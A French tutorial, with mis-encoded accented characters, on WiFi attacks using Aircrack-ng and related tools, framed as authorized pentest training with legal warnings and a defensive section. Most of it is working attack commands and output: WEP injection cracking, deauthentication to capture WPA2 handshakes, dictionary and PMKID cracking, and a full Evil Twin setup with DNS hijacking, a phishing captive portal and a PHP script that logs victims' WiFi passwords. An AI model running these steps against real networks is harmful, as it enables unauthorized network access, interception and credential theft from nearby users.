# Aircrack-ng - Hacking WiFi Professionnel

## üì° Vue d'ensemble

**Aircrack-ng** est LA suite d'outils de r√©f√©rence pour l'audit de s√©curit√© des r√©seaux WiFi. Elle permet de tester la robustesse de TOUS les types de chiffrement WiFi (WEP, WPA, WPA2, WPA3) et d'identifier les vuln√©rabilit√©s.

> **üí° Analogie Simple** : Aircrack-ng c'est comme un trousseau de cl√©s de serrurier sp√©cialis√© dans les serrures sans fil - chaque outil a un usage sp√©cifique pour "crocheter" diff√©rents types de protections WiFi.

## ‚ö†Ô∏è **IMPORTANT - Cadre L√©gal STRICT**

> **üéØ LE HACKING WIFI NON AUTORIS√â = CYBERCRIMINALIT√â !**

### üìù Usage Autoris√© vs INTERDIT :

**‚úÖ STRICTEMENT AUTORIS√â :**
```
‚Ä¢ Tests sur VOS PROPRES r√©seaux WiFi
‚Ä¢ R√©seaux d'entreprise avec autorisation √âCRITE
‚Ä¢ Laboratoires d√©di√©s et isol√©s
‚Ä¢ Formations et certifications officielles
‚Ä¢ Pentest avec contrat sign√©
‚Ä¢ Recherche acad√©mique autoris√©e
```

**‚ùå STRICTEMENT INTERDIT (= PRISON) :**
```
‚Ä¢ Hack de r√©seaux WiFi voisins/publics
‚Ä¢ Acc√®s non autoris√© √† Internet via WiFi
‚Ä¢ √âcoute de trafic r√©seau tiers
‚Ä¢ Vol d'identifiants WiFi
‚Ä¢ Utilisation malveillante des donn√©es
‚Ä¢ Tests sans autorisation explicite
```

**‚öñÔ∏è RAPPEL L√âGAL :**
```
Code P√©nal Fran√ßais Article 323-1 :
"L'acc√®s frauduleux √† un syst√®me automatis√©"
SANCTIONS : 3 ans de prison + 100 000‚Ç¨ d'amende

Article 323-2 : "Entrave au fonctionnement"  
SANCTIONS : 5 ans de prison + 150 000‚Ç¨ d'amende
```

## üéØ Objectifs d'apprentissage

Apr√®s cette section, vous saurez :
1. **Installation et configuration** - Setup Aircrack-ng et cartes WiFi
2. **Modes monitor et injection** - Comprendre la capture sans fil
3. **Attaques WEP/WPA/WPA2** - Techniques de cracking compl√®tes
4. **Evil Twin et point d'acc√®s** - Cr√©er faux hotspots
5. **D√©authentification et PMKID** - Attaques modernes

## üõ†Ô∏è Installation et Configuration

### **Installation sur Kali Linux**
```bash
# Aircrack-ng est pr√©-install√© sur Kali
# V√©rification version
aircrack-ng --help
airodump-ng --help
aireplay-ng --help

# Si pas install√© ou mise √† jour n√©cessaire :
sudo apt update
sudo apt install aircrack-ng

# Outils additionnels recommand√©s
sudo apt install reaver pixiewps hostapd dnsmasq
```

### **Cartes WiFi compatibles**

#### **Cartes WiFi recommand√©es pour pentest**
```bash
# CARTES WIFI AVEC INJECTION CONFIRM√âE :

üèÜ EXCELLENT (injection + monitor mode) :
‚Ä¢ Alfa AWUS036ACS (dual band 802.11ac)
‚Ä¢ Alfa AWUS036NHA (2.4GHz, tr√®s populaire) 
‚Ä¢ Panda PAU09 (2.4GHz, budget)
‚Ä¢ TP-Link AC600 T2U Plus (dual band)

‚úÖ BON (injection limit√©e) :
‚Ä¢ Alfa AWUS036H (ancien mais robuste)
‚Ä¢ Realtek 8188EU based adapters

‚ùå √Ä √âVITER (pas d'injection) :
‚Ä¢ La plupart des cartes int√©gr√©es laptops
‚Ä¢ Broadcom BCM43xx series
‚Ä¢ Cartes "N-only" sans mode monitor

# V√âRIFIER COMPATIBILIT√â :
lsusb
# Rechercher chipset dans bases compatibilit√©
# https://wireless.wiki.kernel.org/en/users/drivers
```

#### **Installation drivers si n√©cessaire**
```bash
# Pour cartes Realtek (exemple)
sudo apt install realtek-rtl88xxau-dkms

# Pour cartes Atheros
sudo apt install firmware-atheros

# Recompiler drivers depuis source (Alfa AWUS036ACS)
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
make && sudo make install

# Red√©marrer ou recharger module
sudo modprobe -r 8812au && sudo modprobe 8812au
```

### **Configuration interface WiFi**

#### **Identifier les interfaces WiFi**
```bash
# Lister toutes interfaces r√©seau
ip link show

# Ou plus sp√©cifique WiFi
iwconfig

# R√©sultat typique :
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   
          Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off

# wlan0 = interface WiFi interne
# wlan1 = interface WiFi USB (si connect√©e)
```

#### **Passer en mode monitor**
```bash
# √âTAPE 1 : Tuer processus qui peuvent interf√©rer
sudo airmon-ng check kill

# PROCESSUS TYPIQUEMENT TU√âS :
# NetworkManager, wpa_supplicant, dhclient

# √âTAPE 2 : Activer mode monitor  
sudo airmon-ng start wlan1

# SORTIE ATTENDUE :
PHY     Interface       Driver          Chipset
phy1    wlan1           88XXau          Realtek Semiconductor Corp. RTL8812AU
                (mac80211 monitor mode vif enabled on [phy1]wlan1mon)

# INTERFACE MONITOR CR√â√âE : wlan1mon

# √âTAPE 3 : V√©rifier mode monitor actif
iwconfig wlan1mon

# R√âSULTAT :
wlan1mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  
          Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```

## üîç Reconnaissance WiFi

### **D√©couverte des r√©seaux disponibles**

#### **Scan basique avec airodump-ng**
```bash
# Scanner TOUS les r√©seaux √† port√©e
sudo airodump-ng wlan1mon

# EXPLICATION DE L'AFFICHAGE :
CH  6 ][ Elapsed: 1 min ][ 2024-01-20 14:30

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   CC  ESSID

 AA:BB:CC:DD:EE:FF  -30       156      47    2   6   54e  WPA2 MonReseauTest
 11:22:33:44:55:66  -45        89       0    0  11  130   WPA2 BBOX-12345678  
 77:88:99:AA:BB:CC  -52        45       12   1   1   54e  WEP  AncienRouteur
 DD:EE:FF:00:11:22  -65        23       0    0   6   54   WPA2 FreeWifi

# EXPLICATION COLONNES :
BSSID = Adresse MAC unique du point d'acc√®s
PWR = Puissance signal (-30 = tr√®s proche, -90 = tr√®s loin)
Beacons = Paquets de balise envoy√©s par l'AP
#Data = Nombre paquets de donn√©es captur√©s
CH = Canal WiFi (1-14 en 2.4GHz, 36+ en 5GHz)
MB = D√©bit maximum support√©  
CC = Chiffrement (WEP, WPA, WPA2, OPN=ouvert)
ESSID = Nom du r√©seau visible
```

#### **Scanner canal sp√©cifique**
```bash
# Se concentrer sur un canal pr√©cis (plus stable)
sudo airodump-ng -c 6 wlan1mon

# Scanner plage de canaux
sudo airodump-ng -c 1-11 wlan1mon

# Scanner uniquement 5GHz
sudo airodump-ng --band a wlan1mon

# Sauvegarder scan dans fichier
sudo airodump-ng -w scan_results wlan1mon
# Cr√©e : scan_results-01.cap, scan_results-01.csv, scan_results-01.kismet.csv
```

### **Capture cibl√©e d'un r√©seau**

#### **Capturer trafic r√©seau sp√©cifique**
```bash
# Cibler un BSSID pr√©cis pour capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture_target wlan1mon

# EXPLICATION PARAM√àTRES :
# -c 6 = Se limiter au canal 6 (√©vite saut de canaux)
# --bssid = Adresse MAC du point d'acc√®s cibl√©  
# -w capture_target = Nom fichier sauvegarde
# wlan1mon = Interface en mode monitor

# AFFICHAGE D√âTAILL√â :
CH  6 ][ Elapsed: 5 mins ][ 2024-01-20 14:35

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   CC  ESSID
 AA:BB:CC:DD:EE:FF  -28  75      856      234   12   6   54e  WPA2 MonReseauTest

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -42    0e- 1e     0      167  
 AA:BB:CC:DD:EE:FF  77:88:99:AA:BB:CC  -55    0e- 0e     0       89

# STATION = Appareils connect√©s au r√©seau (smartphones, PC, etc.)
# Frames = Nombre paquets √©chang√©s par cet appareil
```

## üîì Attaques WEP (Wired Equivalent Privacy)

### **Principe vuln√©rabilit√© WEP**
```bash
# WEP = TR√àS ANCIEN chiffrement (1997)
# COMPL√àTEMENT CASS√â depuis 2001

POURQUOI WEP EST VULN√âRABLE :
1. Cl√© de chiffrement faible (40-bit ou 104-bit)
2. Vecteur d'initialisation (IV) r√©p√©t√©  
3. M√™me cl√© utilis√©e pour tous clients
4. Algorithme RC4 mal impl√©ment√©

TEMPS POUR CASSER WEP :
‚Ä¢ R√©seau actif (trafic) : 5-15 minutes
‚Ä¢ R√©seau inactif : 2-6 heures (avec injection)
‚Ä¢ R√©seau abandonn√© : Impossible (pas de trafic)

PAQUETS N√âCESSAIRES :
‚Ä¢ WEP 64-bit : ~20 000 paquets IV uniques
‚Ä¢ WEP 128-bit : ~40 000 paquets IV uniques
```

### **Attaque WEP passive**
```bash
# √âTAPE 1 : Capturer trafic WEP
sudo airodump-ng -c 6 --bssid 77:88:99:AA:BB:CC -w wep_capture wlan1mon

# Attendre accumulation paquets (colonne #Data)
# Objectif : 20 000+ paquets pour WEP 64-bit

# √âTAPE 2 : Tenter crack avec paquets captur√©s
aircrack-ng wep_capture-01.cap

# SORTIE SUCC√àS :
                             [00:01:45] Tested 156742 keys (got 24953 IVs)

   KB    depth   byte(vote)
    0    0/  9   12(29952) A4(29184) 3F(28928) C6(28672) 6E(28416)
    1    0/  7   34(30464) F1(30208) 51(29696) C7(29440) 22(29184)
    2    0/  8   56(30720) AB(30464) 78(30208) 9C(29952) D3(29696)
    3    0/  6   78(31232) EF(30976) 9A(30720) BC(30464) 12(30208)
    4    0/  4   9A(31488) DE(31232) F0(30976) 23(30720) 45(30464)

                         KEY FOUND! [ 12:34:56:78:9A ]
        
# CL√â WEP TROUV√âE : 12:34:56:78:9A
# Se connecter : sudo iwconfig wlan1 key 12:34:56:78:9A
```

### **Attaque WEP avec injection**
```bash
# Si peu de trafic naturel, forcer g√©n√©ration paquets

# √âTAPE 1 : Test injection possible
sudo aireplay-ng -9 -e "AncienRouteur" -a 77:88:99:AA:BB:CC wlan1mon

# SORTIE TEST INJECTION :
14:35:12  Waiting for beacon frame (BSSID: 77:88:99:AA:BB:CC) on channel 6
14:35:12  Trying broadcast probe requests...
14:35:13  Injection is working!
14:35:13  Found 1 AP

# √âTAPE 2 : Association fake (authentification ouverte WEP)
sudo aireplay-ng -1 0 -e "AncienRouteur" -a 77:88:99:AA:BB:CC -h 00:11:22:33:44:55 wlan1mon

# PARAM√àTRES :
# -1 0 = Fake authentication, 0 = d√©lai re-association
# -e = Nom r√©seau (ESSID)
# -a = BSSID (adresse MAC point acc√®s)  
# -h = Adresse MAC spoof√©e (notre carte)

# √âTAPE 3 : Injection ARP replay (g√©n√®re beaucoup trafic)
sudo aireplay-ng -3 -b 77:88:99:AA:BB:CC -h 00:11:22:33:44:55 wlan1mon

# PENDANT l'injection, dans autre terminal :
sudo airodump-ng -c 6 --bssid 77:88:99:AA:BB:CC -w wep_inject wlan1mon

# Observer colonne #Data augmenter rapidement : 100, 500, 1000, 5000...

# √âTAPE 4 : Crack quand suffisamment paquets
aircrack-ng wep_inject-01.cap
```

## üîê Attaques WPA/WPA2 Personal (PSK)

### **Principe vuln√©rabilit√© WPA2-PSK**
```bash
# WPA2-PSK = WiFi Protected Access 2 - Pre-Shared Key

S√âCURIT√â WPA2 :
‚úÖ Chiffrement fort (AES-CCMP)
‚úÖ Cl√©s temporelles (changent r√©guli√®rement)  
‚úÖ Pas de IV r√©utilis√©s comme WEP

FAIBLESSE WPA2 :
‚ùå 4-way handshake capturables
‚ùå Attaque dictionnaire possible
‚ùå Mots de passe faibles vuln√©rables

M√âTHODE ATTAQUE :
1. Capturer 4-way handshake complet
2. Bruteforce offline avec dictionnaires
3. Si mot de passe simple ‚Üí compromis
```

### **Capture du handshake WPA2**

#### **M√©thode passive (attendre connexion)**
```bash
# √âTAPE 1 : Capturer trafic r√©seau cible
sudo airodump-ng -c 11 --bssid 11:22:33:44:55:66 -w handshake_capture wlan1mon

# ATTENDRE qu'un appareil se connecte naturellement
# Visible dans STATION quand nouvelle connexion

# √âTAPE 2 : V√©rifier handshake captur√©
aircrack-ng handshake_capture-01.cap

# SORTIE SI HANDSHAKE COMPLET :
Reading packets, please wait...
Opening handshake_capture-01.cap
Read 15642 packets.

#  BSSID              ESSID                     Encryption

1  11:22:33:44:55:66  BBOX-12345678            WPA (1 handshake)

# "1 handshake" = SUCC√àS ! Handshake complet captur√©
```

#### **M√©thode active (d√©authentification)**
```bash
# Forcer d√©connexion appareil pour provoquer reconnexion

# √âTAPE 1 : Identifier client connect√©
sudo airodump-ng -c 11 --bssid 11:22:33:44:55:66 wlan1mon

# Noter adresse MAC dans colonne STATION : 99:AA:BB:CC:DD:EE

# √âTAPE 2 : Commencer capture handshake
sudo airodump-ng -c 11 --bssid 11:22:33:44:55:66 -w forced_handshake wlan1mon

# √âTAPE 3 : Dans autre terminal, d√©authentifier client
sudo aireplay-ng -0 5 -a 11:22:33:44:55:66 -c 99:AA:BB:CC:DD:EE wlan1mon

# PARAM√àTRES D√âAUTH :
# -0 5 = Envoi 5 paquets d√©authentification
# -a = BSSID point d'acc√®s
# -c = Adresse MAC client √† d√©connecter
# Si pas -c = d√©connecte TOUS les clients

# DANS AIRODUMP, voir message : "WPA handshake: 11:22:33:44:55:66"
```

### **Cracking du handshake**

#### **Attaque dictionnaire classique**
```bash
# Utiliser wordlist pour tester mots de passe

# WORDLISTS COMMUNES :
# /usr/share/wordlists/rockyou.txt (14M mots de passe)
# /usr/share/wordlists/dirb/others/best110.txt (110 passwords communs)

# CRACK AVEC ROCKYOU :
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake_capture-01.cap

# AFFICHAGE PENDANT CRACK :
[00:01:32] 127843/14344391 keys tested (1432.73 k/s) 

Time left: 2 hours, 45 minutes                           0.89%

                           KEY FOUND! [ password123 ]

Master Key     : CD 4F 8B 3A 51 75 C9 E8 47 F4 D3 B1 1C C7 29 A5 
                 41 96 7C 8F 9D B5 E2 7A F9 8C 63 B4 85 12 F7 E3 

Transient Key  : AA 5E 7B 2F 85 91 D6 C4 1F B8 7E A9 33 D2 48 F1 
                 73 C8 95 A7 E4 6F B9 82 5A D1 C7 94 6E 38 B5 F2 

EAPOL HMAC     : 8D F5 A1 B3 C7 E9 4A 76 2F D8 E1 59 C4 B7 A3 E6

# MOT DE PASSE TROUV√â : password123
```

#### **Cr√©ation wordlist personnalis√©e**
```bash
# G√©n√©rer wordlist cibl√©e avec crunch
crunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t @@@@2024 -o wordlist_2024.txt

# PARAM√àTRES CRUNCH :
# 8 12 = longueur min-max password
# abcd... = charset utilis√©  
# -t @@@@2024 = pattern (@@@@=4 chars al√©atoires + "2024")
# -o = fichier sortie

# Exemples mots de passe g√©n√©r√©s :
abcd2024, Test2024, wifi2024, pass2024...

# Wordlist ESSID-based (nom r√©seau)
echo "BBOX-12345678" | sed 's/BBOX-//' > temp.txt
echo "bbox12345678" >> temp.txt  
echo "12345678" >> temp.txt
echo "Bbox12345678" >> temp.txt

# Crack avec wordlist personnalis√©e
aircrack-ng -w wordlist_custom.txt handshake_capture-01.cap
```

#### **Attaque avec r√®gles John the Ripper**
```bash
# Convertir handshake pour John the Ripper
hccap2john handshake_capture-01.cap > hash_john.txt

# Crack avec r√®gles de mutation
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash_john.txt

# R√àGLES BEST64 appliquent mutations :
# password ‚Üí Password, password1, password!, drowssap, etc.

# Voir r√©sultat  
john --show hash_john.txt
```

## üé≠ Attaques PMKID (WPA2 sans handshake)

### **Principe attaque PMKID**
```bash
# PMKID = Pairwise Master Key Identifier  
# Vuln√©rabilit√© d√©couverte en 2018 par Jens Steube (hashcat)

AVANTAGE PMKID :
‚úÖ Pas besoin d'attendre handshake client
‚úÖ Une seule requ√™te au point d'acc√®s
‚úÖ Plus discret que d√©authentification
‚úÖ Fonctionne m√™me sans clients connect√©s

LIMITATION :
‚ùå Tous routeurs ne supportent pas
‚ùå Certains ont patch√© la vuln√©rabilit√©
‚ùå Toujours bruteforce dictionnaire apr√®s
```

### **Capture PMKID avec hcxdumptool**
```bash
# Installation hcxtools
sudo apt install hcxtools

# Capture PMKID
sudo hcxdumptool -i wlan1mon -o pmkid_capture.pcapng --enable_status=1

# SORTIE PENDANT CAPTURE :
INTERFACE.......: wlan1mon
MAC CLIENT......: a0:b1:c2:d3:e4:f5
MAC AP..........: 11:22:33:44:55:66
PMKID...........: 2582a8281bf9d96e5b5ad23b4a5e7a4e
ESSID...........: BBOX-12345678

# PMKID captur√© ! Arr√™ter avec Ctrl+C

# Convertir au format hashcat
hcxpcapngtool -o pmkid_hashes.txt pmkid_capture.pcapng

# Fichier pmkid_hashes.txt contient :
2582a8281bf9d96e5b5ad23b4a5e7a4e*112233445566*a0b1c2d3e4f5*424248532d3132333435363738
```

### **Cracking PMKID avec hashcat**
```bash
# Crack PMKID avec hashcat (plus rapide qu'aircrack)
hashcat -m 16800 pmkid_hashes.txt /usr/share/wordlists/rockyou.txt

# PARAM√àTRES :
# -m 16800 = Mode PMKID WPA/WPA2
# pmkid_hashes.txt = Hash captur√©
# rockyou.txt = Dictionnaire

# SORTIE SUCC√àS :
2582a8281bf9d96e5b5ad23b4a5e7a4e*112233445566*a0b1c2d3e4f5*424248532d3132333435363738:password123

Session..........: hashcat
Status...........: Cracked
Hash.Name........: WPA-PMKID-PBKDF2
Hash.Target......: 2582a8281bf9d96e5b5ad23b4a5e7a4e*112233445566*a0b1c2...3435363738
Time.Started.....: Sat Jan 20 14:45:12 2024 (1 min, 23 secs)
Time.Estimated...: Sat Jan 20 14:46:35 2024 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Speed.#1.........:    4567 H/s (8.92ms) @ Accel:64 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests

# PASSWORD TROUV√â : password123
```

## üï∏Ô∏è Evil Twin et Rogue Access Points

### **Principe Evil Twin**
```bash
# EVIL TWIN = Faux point d'acc√®s avec m√™me nom que l√©gitime

OBJECTIFS EVIL TWIN :
1. Voler credentials WiFi (phishing captive portal)
2. Intercepter trafic utilisateurs (MITM)
3. Servir malware via pages web
4. Collecter informations personnelles

TECHNIQUE :
1. Cr√©er AP avec ESSID identique au l√©gal
2. Puissance signal plus forte
3. Utilisateurs se connectent au faux
4. Captive portal demande "re-connexion"
5. Vol credentials + navigation pi√©g√©e
```

### **Cr√©ation Evil Twin avec hostapd**

#### **Configuration hostapd**
```bash
# √âTAPE 1 : Cr√©er fichier configuration
sudo nano /etc/hostapd/evil_twin.conf

# CONTENU FICHIER :
interface=wlan1
driver=nl80211
ssid=FreeWifi_Secure
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=MotDePasseFaux123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP

# EXPLICATION CONFIG :
# ssid = Nom r√©seau (copier r√©seau l√©gitime)
# channel = Canal (id√©al = m√™me que l√©gitime)
# wpa_passphrase = Mot de passe bidon
# driver=nl80211 = Driver WiFi moderne
```

#### **Configuration DHCP avec dnsmasq**
```bash
# √âTAPE 2 : Configurer serveur DHCP/DNS
sudo nano /etc/dnsmasq_evil.conf

# CONTENU :
interface=wlan1
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1

# EXPLICATION :
# dhcp-range = IPs attribu√©es aux clients
# dhcp-option=3 = Gateway (notre machine)
# dhcp-option=6 = DNS server (notre machine)  
# address=/#/192.168.1.1 = Tout DNS ‚Üí notre IP
```

#### **Lancement Evil Twin**
```bash
# √âTAPE 3 : Configuration interface
sudo ifconfig wlan1 192.168.1.1 netmask 255.255.255.0

# √âTAPE 4 : Routage IP (partage connexion)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# √âTAPE 5 : D√©marrer services
sudo hostapd /etc/hostapd/evil_twin.conf &
sudo dnsmasq -C /etc/dnsmasq_evil.conf -d &

# √âTAPE 6 : V√©rifier AP actif
iwconfig wlan1
# Mode:Master = Point d'acc√®s actif
```

### **Captive portal phishing**

#### **Serveur web Apache simple**
```bash
# √âTAPE 1 : Installer Apache
sudo apt install apache2 php

# √âTAPE 2 : Cr√©er page phishing WiFi
sudo nano /var/www/html/index.html

# CONTENU PAGE PHISHING :
<!DOCTYPE html>
<html>
<head>
    <title>Connexion WiFi S√©curis√©e</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; }
        .login-box { 
            width: 400px; margin: 100px auto; 
            background: white; padding: 30px; 
            border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1);
        }
        input[type="password"] { 
            width: 100%; padding: 10px; margin: 10px 0; 
            border: 1px solid #ddd; border-radius: 5px;
        }
        .btn { 
            background: #007cba; color: white; 
            padding: 12px 30px; border: none; 
            border-radius: 5px; cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>üîí S√©curit√© WiFi</h2>
        <p>Pour des raisons de s√©curit√©, veuillez confirmer le mot de passe WiFi :</p>
        
        <form action="capture.php" method="POST">
            <label>R√©seau : <strong>FreeWifi_Secure</strong></label><br>
            <input type="password" name="wifi_password" placeholder="Mot de passe WiFi" required>
            <br><br>
            <button type="submit" class="btn">Se connecter</button>
        </form>
        
        <p style="font-size: 12px; color: #666;">
        Connexion s√©curis√©e par protocole WPA2-Enterprise
        </p>
    </div>
</body>
</html>
```

#### **Script capture credentials**
```bash
# √âTAPE 3 : Script PHP capture mots de passe
sudo nano /var/www/html/capture.php

# CONTENU SCRIPT :
<?php
$password = $_POST['wifi_password'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Sauvegarder credential
$log = "[$timestamp] IP: $ip | Password: $password | UA: $user_agent\n";
file_put_contents('/tmp/evil_twin_capture.log', $log, FILE_APPEND);

// Rediriger vers vrai site
header('Location: https://www.google.com');
exit();
?>

# √âTAPE 4 : D√©marrer serveur web
sudo systemctl start apache2

# √âTAPE 5 : Redirection tout trafic web vers captive portal
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
```

## üîí Attaques WPA3

### **Vuln√©rabilit√©s WPA3 connues**

#### **Dragonfly handshake attacks**
```bash
# WPA3 utilise SAE (Simultaneous Authentication of Equals)
# Vuln√©rabilit√©s d√©couvertes en 2019 (Dragonblood)

VULN√âRABILIT√âS WPA3 :
‚Ä¢ CVE-2019-13456 : Information leak via timing
‚Ä¢ CVE-2019-13377 : Cache-based side channel  
‚Ä¢ CVE-2019-13466 : Dictionary attack possible

OUTILS POUR WPA3 :
‚Ä¢ dragonforce (attaque dictionnaire SAE)
‚Ä¢ dragondrain (DoS WPA3 handshake)
‚Ä¢ dragontime (timing attack)
```

#### **Attaque WPA3 avec dragonforce**
```bash
# Installation outils WPA3
git clone https://github.com/vanhoefm/dragondrain-and-time.git
cd dragondrain-and-time

# Compilation
make

# Capture handshake WPA3 (similaire WPA2)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa3_capture wlan1mon

# Attaque dictionnaire WPA3 SAE
./dragonforce wpa3_capture-01.cap /usr/share/wordlists/rockyou.txt

# PLUS LENT que WPA2 car SAE plus robuste
```

## üõ°Ô∏è D√©tection et Protection

### **D√©tection attaques WiFi**

#### **Monitoring avec Kismet**
```bash
# Installation Kismet (d√©tecteur d'intrusion WiFi)
sudo apt install kismet

# Lancement Kismet
sudo kismet

# Interface web : http://localhost:2501

# D√âTECTIONS KISMET :
üö® Rogue Access Points (Evil Twin)
üö® D√©authentification attacks  
üö® Injection attacks
üö® Unusual probe requests
üö® Handshake captures
üö® WPS attacks
```

#### **D√©tection Evil Twin**
```bash
# Script d√©tection Evil Twin
#!/bin/bash
# detect_evil_twin.sh

KNOWN_BSSID="11:22:33:44:55:66"  # BSSID l√©gitime
KNOWN_ESSID="MonReseauLegal"

while true; do
    # Scanner r√©seaux avec m√™me ESSID
    iwlist wlan0 scan | grep -A 5 -B 5 "$KNOWN_ESSID" | while read line; do
        if [[ $line == *"Address:"* ]]; then
            DETECTED_BSSID=$(echo $line | cut -d' ' -f5)
            if [[ "$DETECTED_BSSID" != "$KNOWN_BSSID" ]]; then
                echo "[ALERT] Evil Twin d√©tect√© !"
                echo "ESSID: $KNOWN_ESSID"
                echo "BSSID l√©gitime: $KNOWN_BSSID"  
                echo "BSSID suspect: $DETECTED_BSSID"
                echo "Time: $(date)"
                echo "---"
            fi
        fi
    done
    sleep 30
done
```

### **Protections recommand√©es**

#### **Configuration s√©curis√©e routeur WiFi**
```bash
# RECOMMANDATIONS S√âCURIT√â WIFI :

üîí CHIFFREMENT :
‚úÖ WPA3-Personal (ou minimum WPA2-Personal)  
‚ùå JAMAIS WEP ou Open
‚úÖ AES-CCMP (pas TKIP)

üîë MOT DE PASSE :
‚úÖ 20+ caract√®res al√©atoires
‚úÖ M√©lange majuscules/minuscules/chiffres/symboles
‚ùå Pas de mots dictionnaire
‚ùå Pas d'infos personnelles

üì° CONFIGURATION :
‚úÖ D√©sactiver WPS (Pin et Push Button)
‚úÖ Masquer SSID (security by obscurity limit√©e)
‚úÖ Filtrage MAC (limitation pratique)
‚úÖ R√©duire puissance signal si possible

üîÑ MONITORING :
‚úÖ Logs d'authentification activ√©s
‚úÖ Alertes connexions inconnues
‚úÖ Surveillance d√©connexions fr√©quentes
‚úÖ Audit r√©gulier clients connect√©s

üìã R√âSEAU D'ENTREPRISE :
‚úÖ WPA2/WPA3-Enterprise (802.1X)
‚úÖ Serveur RADIUS d√©di√©
‚úÖ Certificats clients
‚úÖ VLAN s√©gr√©gation
‚úÖ NAC (Network Access Control)
```

## üìã Checklist Audit WiFi

### **Pr√©paration audit**
```bash
‚òê Autorisation √©crite obtenue pour tous r√©seaux
‚òê Scope d√©fini (quels r√©seaux, quelles techniques)
‚òê Cartes WiFi compatibles test√©es
‚òê Outils √† jour (aircrack-ng, hashcat, etc.)
‚òê Wordlists pr√©par√©es et adapt√©es
‚òê Environnement de test isol√©
‚òê Documentation template pr√™te
‚òê Planning d√©fini (heures creuses si prod)
```

### **Tests techniques**
```bash
‚òê Scan d√©couverte tous r√©seaux √† port√©e
‚òê Identification chiffrements utilis√©s
‚òê Test vuln√©rabilit√©s WEP (si pr√©sent)
‚òê Capture handshakes WPA/WPA2
‚òê Test attaques PMKID
‚òê Audit force mots de passe (dictionnaire)
‚òê Test Evil Twin (si autoris√©)
‚òê V√©rification WPS activ√©/vuln√©rable
‚òê Test d√©authentification DoS
‚òê Analyse clients connect√©s
‚òê Test d√©connexions anormales
‚òê V√©rification isolation r√©seaux
```

### **Rapport et recommandations**
```bash
‚òê Inventaire complet r√©seaux d√©tect√©s
‚òê Classification niveaux s√©curit√©
‚òê Mots de passe compromis list√©s
‚òê Vuln√©rabilit√©s techniques d√©taill√©es
‚òê Preuves de concept (screenshots)
‚òê Impact business √©valu√©
‚òê Recommandations prioris√©es
‚òê Plan remediation avec d√©lais
‚òê Sensibilisation utilisateurs pr√©vue
‚òê Retests programm√©s
```

## üéØ Ressources et R√©f√©rences

### **Documentation officielle**
- **Aircrack-ng** : https://www.aircrack-ng.org/documentation.html
- **Hashcat** : https://hashcat.net/wiki/
- **Hostapd** : https://w1.fi/hostapd/
- **IEEE 802.11** : https://standards.ieee.org/standard/802_11-2020.html

### **Bases de donn√©es vuln√©rabilit√©s**
- **WPA/WPA2 Research** : https://papers.mathyvanhoef.com/
- **WiFi Security Research** : https://www.krackattacks.com/
- **Dragonblood WPA3** : https://wpa3.mathyvanhoef.com/

### **Wordlists et dictionnaires**
- **SecLists** : https://github.com/danielmiessler/SecLists/tree/master/Passwords/WiFi-WPA
- **WiFi passwords** : https://github.com/kennyn510/wpa2-wordlists
- **Crunch generator** : https://sourceforge.net/projects/crunch-wordlist/

---
*Le WiFi est omnipr√©sent mais souvent mal s√©curis√©. Ma√Ætriser son audit est essentiel pour tout expert en cybers√©curit√© !* 